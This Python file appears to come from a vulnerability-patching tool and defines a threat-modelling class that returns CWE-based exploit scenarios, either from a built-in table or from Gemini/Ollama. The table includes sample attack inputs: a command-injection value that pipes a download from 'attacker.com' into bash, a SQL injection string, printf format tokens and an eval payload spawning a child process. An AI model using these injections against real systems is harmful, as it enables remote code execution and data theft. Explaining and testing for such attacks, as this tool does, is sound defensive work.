import os
import json
from dataclasses import dataclass
from typing import Dict, Any, Optional

try:
    import requests
except ImportError:
    requests = None

@dataclass
class ThreatIntelligence:
    cwe_id: str
    cvss_score: float
    attack_vector: str
    business_impact: str
    exploit_scenario: str
    verification_step: str
    provider_used: str

class AIReasoner:
    """
    Hybrid Deep Security Reasoning & Threat Modeling Engine.
    Works 100% offline via deterministic threat intelligence base,
    or connects optionally to Google Gemini / OpenAI / Ollama for live synthesis.
    """

    OFFLINE_THREAT_BASE = {
                "CWE-120": {
            "cvss_score": 9.8,
            "attack_vector": "Writing unbounded input buffer data past allocated stack memory bounds overwrites return address register ($RIP/$EIP), leading to arbitrary shellcode execution or segmentation crash.",
            "business_impact": "Full process takeover, root/admin shell escalation, memory corruption, and remote code execution.",
            "exploit_scenario": "1. Attacker sends 512 bytes into 64-byte buffer.\\n2. Return address overwritten with shellcode pointer.\\n3. Arbitrary native instructions executed.",
            "verification_step": "Compile with AddressSanitizer (-fsanitize=address) and test with inputs exceeding target buffer capacity."
        },
        "CWE-676": {
            "cvss_score": 9.8,
            "attack_vector": "Using gets() cannot be bounded by any buffer length parameter, guaranteeing stack smashing upon receiving oversized input.",
            "business_impact": "Remote code execution, memory integrity loss, and immediate service crash.",
            "exploit_scenario": "1. Attacker sends oversized line via stdin.\\n2. Buffer overflows adjacent stack variables.\\n3. Hijacked execution flow.",
            "verification_step": "Replace with fgets() specifying exact buffer bound."
        },
        "CWE-134": {
            "cvss_score": 8.6,
            "attack_vector": "Directly passing untrusted strings as format parameter to printf() allows attackers to read arbitrary stack memory (%x, %p) or write to memory using %n specifier.",
            "business_impact": "Information disclosure (leaking ASLR canary and heap pointers), arbitrary memory corruption, and code execution.",
            "exploit_scenario": "1. Attacker supplies input: `%x %x %x %n`.\\n2. Process reads secret stack values and writes to memory address.\\n3. Denial of service or privilege escalation achieved.",
            "verification_step": "Submit string inputs containing %x and %n tokens and verify literal string printing without format interpretation."
        },
        "CWE-798": {
            "cvss_score": 9.8,
            "attack_vector": "Attacker crawls public Git history, leaked fork, or client bundle, extracts credentials, and gains direct unauthenticated access to backing infrastructure.",
            "business_impact": "Unauthorized infrastructure takeover, massive API bill exploitation (e.g. LLM/AWS abuse), data exfiltration, and regulatory fines under SOC2/GDPR.",
            "exploit_scenario": "1. Attacker scrapes commit diff.\n2. Token is used via curl against vendor endpoints.\n3. Complete administrative impersonation achieved without triggering 2FA.",
            "verification_step": "Revoke the exposed key immediately in the provider console, rotate credentials, and verify that the application only retrieves secrets via `os.environ` or vault services."
        },
        "CWE-89": {
            "cvss_score": 9.8,
            "attack_vector": "Unsanitized user parameters injected directly into SQL query strings allow attackers to break query structure and execute arbitrary SQL syntax.",
            "business_impact": "Full database exfiltration (credentials, PII, financial data), authentication bypass, and potential database server file system access or deletion.",
            "exploit_scenario": "1. User submits input: `' OR '1'='1' -- `.\n2. Query evaluates to TRUE unconditionally.\n3. Entire customer table dumped without authentication.",
            "verification_step": "Test with SQL payloads like `' OR '1'='1` and verify the database treats input strictly as literal string parameters, returning 0 unauthenticated rows."
        },
        "CWE-78": {
            "cvss_score": 9.8,
            "attack_vector": "Untrusted inputs concatenated into shell command strings allow attackers to inject shell metacharacters (; | && ` $) to execute arbitrary OS commands.",
            "business_impact": "Full host operating system compromise, reverse shell deployment, lateral network movement, ransomware propagation, and host takeover.",
            "exploit_scenario": "1. Input passed as: `report.pdf; curl attacker.com/malware | bash`.\n2. Host system spawns shell and downloads malware payload.\n3. Remote interactive shell established.",
            "verification_step": "Execute with argument containing `; echo VULN_CHECK`. Ensure host treats argument as single literal file argument without running subcommands."
        },
        "CWE-95": {
            "cvss_score": 9.8,
            "attack_vector": "Passing dynamic or untrusted strings into JavaScript `eval()` or Function constructors executes attacker-controlled code inside the Node/browser process.",
            "business_impact": "Remote code execution, memory tampering, prototype pollution, session hijacking, and application crash.",
            "exploit_scenario": "1. Attacker sends JSON payload with nested JS: `(()=>{ require('child_process').exec('id') })()`.\n2. `eval()` executes payload with full server process privileges.",
            "verification_step": "Verify parsing is performed strictly using `JSON.parse()` and that dynamic syntax evaluation is blocked at compiler level."
        },
        "CWE-775": {
            "cvss_score": 6.5,
            "attack_vector": "Opening operating system file handles without deterministically closing them leaves system descriptors active indefinitely during load spikes.",
            "business_impact": "Resource exhaustion (Too many open files - errno 24), application thread starvation, denial of service (DoS), and degraded server availability.",
            "exploit_scenario": "1. Repeated API requests trigger file open calls without closing.\n2. OS file descriptor limit (e.g. 1024) is hit.\n3. All subsequent requests fail with fatal OSError.",
            "verification_step": "Simulate 5,000 concurrent file operations and inspect process handles using `lsof -p <PID>` to confirm descriptor count returns to zero."
        },
        "CWE-369": {
            "cvss_score": 7.5,
            "attack_vector": "Arithmetic division performed against untrusted or unvalidated denominator variables that can evaluate to 0, triggering uncaught ZeroDivisionError.",
            "business_impact": "Worker process termination, uncaught 500 Internal Server Errors, batch job failure, and Denial of Service for active users.",
            "exploit_scenario": "1. Client submits parameter `count=0` or empty array.\n2. Calculation `total / count` crashes python process.\n3. HTTP transaction aborts without graceful recovery.",
            "verification_step": "Submit edge-case inputs with denominator `0`, `0.0`, and empty sequences, ensuring fallback guard executes without throwing exceptions."
        }
    }

    def __init__(self, api_key: Optional[str] = None, provider: str = "offline", base_url: Optional[str] = None):
        self.api_key = api_key or os.getenv("AUTOPATCH_AI_API_KEY") or os.getenv("GEMINI_API_KEY")
        self.provider = provider.lower()
        self.base_url = base_url

    def analyze_threat(
        self,
        category: str,
        problem_code: str,
        fixed_code: str,
        cwe_id: Optional[str] = None,
        language: str = "python"
    ) -> ThreatIntelligence:
        cwe_key = (cwe_id or "CWE-89").upper()
        default_intel = self.OFFLINE_THREAT_BASE.get(cwe_key, {
            "cvss_score": 7.5,
            "attack_vector": f"Vulnerability in {language} code allows unintended application behavior or security boundary bypass.",
            "business_impact": "Potential security degradation, compliance failure, or runtime process termination.",
            "exploit_scenario": f"1. Attacker crafts malformed input targeting: {problem_code}\n2. System processes input without adequate defense.",
            "verification_step": f"Verify patch replacing `{problem_code}` with `{fixed_code}` blocks invalid input."
        })

        # If live LLM provider is requested and API key/URL is present, attempt live AI synthesis
        if self.provider in ["gemini", "google"] and self.api_key and requests:
            try:
                live_intel = self._call_gemini_api(category, problem_code, fixed_code, cwe_key, language)
                if live_intel:
                    return live_intel
            except Exception as e:
                print(f"[*] Note: Live Gemini reasoning failed ({e}). Falling back to deterministic threat engine.")

        elif self.provider in ["ollama", "local"] and requests:
            try:
                live_intel = self._call_ollama_api(category, problem_code, fixed_code, cwe_key, language)
                if live_intel:
                    return live_intel
            except Exception as e:
                print(f"[*] Note: Local Ollama reasoning failed ({e}). Falling back to deterministic threat engine.")

        # Deterministic Offline Intelligence
        return ThreatIntelligence(
            cwe_id=cwe_key,
            cvss_score=default_intel["cvss_score"],
            attack_vector=default_intel["attack_vector"],
            business_impact=default_intel["business_impact"],
            exploit_scenario=default_intel["exploit_scenario"],
            verification_step=default_intel["verification_step"],
            provider_used="Deterministic Expert Intelligence (Offline 0ms)"
        )

    def _call_gemini_api(self, category: str, problem_code: str, fixed_code: str, cwe_key: str, language: str) -> Optional[ThreatIntelligence]:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={self.api_key}"
        prompt = f"""You are a Lead Application Security Engineer. Analyze this vulnerability:
Category: {category} ({cwe_key})
Language: {language}
Vulnerable Code:
{problem_code}

Proposed Fix:
{fixed_code}

Return ONLY a valid JSON object with these exact keys:
{{
  "cvss_score": 9.8,
  "attack_vector": "short explanation of attack vector",
  "business_impact": "real world business & compliance risk",
  "exploit_scenario": "step 1, step 2, step 3",
  "verification_step": "how to verify the fix"
}}"""

        headers = {"Content-Type": "application/json"}
        payload = {"contents": [{"parts": [{"text": prompt}]}]}
        resp = requests.post(url, headers=headers, json=payload, timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            raw_text = data['candidates'][0]['content']['parts'][0]['text'].strip()
            # Clean possible markdown block
            if raw_text.startswith("```json"):
                raw_text = raw_text[7:]
            if raw_text.startswith("```"):
                raw_text = raw_text[3:]
            if raw_text.endswith("```"):
                raw_text = raw_text[:-3]
            parsed = json.loads(raw_text.strip())
            return ThreatIntelligence(
                cwe_id=cwe_key,
                cvss_score=float(parsed.get("cvss_score", 8.0)),
                attack_vector=parsed.get("attack_vector", ""),
                business_impact=parsed.get("business_impact", ""),
                exploit_scenario=parsed.get("exploit_scenario", ""),
                verification_step=parsed.get("verification_step", ""),
                provider_used="Gemini 1.5 Flash (Live AI Synthesis)"
            )
        return None

    def _call_ollama_api(self, category: str, problem_code: str, fixed_code: str, cwe_key: str, language: str) -> Optional[ThreatIntelligence]:
        url = (self.base_url or "http://localhost:11434") + "/api/generate"
        prompt = f"Analyze vulnerability {category} ({cwe_key}) in code: {problem_code}. Output JSON with keys cvss_score, attack_vector, business_impact, exploit_scenario, verification_step."
        payload = {"model": "llama3", "prompt": prompt, "stream": False, "format": "json"}
        resp = requests.post(url, json=payload, timeout=8)
        if resp.status_code == 200:
            parsed = json.loads(resp.json().get("response", "{}"))
            return ThreatIntelligence(
                cwe_id=cwe_key,
                cvss_score=float(parsed.get("cvss_score", 8.0)),
                attack_vector=parsed.get("attack_vector", ""),
                business_impact=parsed.get("business_impact", ""),
                exploit_scenario=parsed.get("exploit_scenario", ""),
                verification_step=parsed.get("verification_step", ""),
                provider_used="Ollama Local LLM (Privacy-First)"
            )
        return None
